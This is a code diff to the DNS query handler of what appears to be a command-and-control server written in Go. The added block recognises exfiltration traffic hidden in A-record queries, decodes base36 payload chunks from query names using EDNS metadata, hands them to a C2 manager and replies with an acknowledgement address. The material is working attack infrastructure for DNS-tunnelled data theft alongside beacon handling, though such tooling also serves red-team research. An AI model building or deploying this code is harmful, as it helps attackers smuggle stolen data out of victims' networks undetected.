@@ -252,6 +252,40 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 		return serializeMessage(resp), nil
 	}
 
+	q := msg.Questions[0]
+
+	// Detect dedicated exfil client traffic first (uses EDNS metadata + A queries)
+	if q.Type == 1 {
+		meta, metaErr := extractExfilMetadata(msg)
+		if metaErr != nil {
+			if debugMode {
+				logf("[Exfil] Failed to parse EDNS metadata: %v", metaErr)
+			}
+		} else if meta != nil {
+			encoded, ok := extractExfilPayloadFromQName(q.Name)
+			ack := false
+			if !ok {
+				if debugMode {
+					logf("[Exfil] Unable to extract base36 payload from %s", q.Name)
+				}
+			} else {
+				ack, err = c2Manager.handleExfilChunk(encoded, meta, clientIP)
+				if err != nil && debugMode {
+					logf("[Exfil] Chunk processing error: %v", err)
+				}
+			}
+			answers := []DNSResourceRecord{{
+				Name:  q.Name,
+				Type:  1,
+				Class: 1,
+				TTL:   1,
+				RData: ackIPAddress(cfg.SvrAddr, ack),
+			}}
+			respMsg := buildResponse(msg, answers, 0)
+			return serializeMessage(respMsg), nil
+		}
+	}
+
 	// Check for C2 beacon communication first
 	for _, q := range msg.Questions {
 		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")
